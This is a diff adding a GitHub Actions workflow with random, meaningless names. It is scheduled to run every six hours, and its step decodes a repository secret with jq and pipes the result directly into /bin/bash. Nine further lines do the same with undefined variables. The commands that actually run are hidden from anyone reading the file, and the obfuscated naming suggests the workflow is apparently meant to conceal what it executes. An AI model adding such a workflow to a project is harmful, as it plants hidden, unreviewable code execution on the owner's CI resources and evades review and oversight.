@@ -1,0 +1,27 @@
+name: diulujunyi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: diulujunyi
+        env:
+          h7015: ${{ secrets.h7015 }}
+        run: |
+          echo $h7015 | jq -r .wpvy3193 | /bin/bash
+          echo $v4153 | jq -r .f48 | /bin/bash
+          echo $u3 | jq -r .et2 | /bin/bash
+          echo $pjx02 | jq -r .ta7 | /bin/bash
+          echo $zortu1923 | jq -r .uudd6 | /bin/bash
+          echo $gkwh7 | jq -r .y3041 | /bin/bash
+          echo $e8 | jq -r .sdyeu39826 | /bin/bash
+          echo $et0 | jq -r .gm96 | /bin/bash
+          echo $pp1 | jq -r .fftg17 | /bin/bash
+          echo $ndfa10384 | jq -r .wsw204 | /bin/bash
+
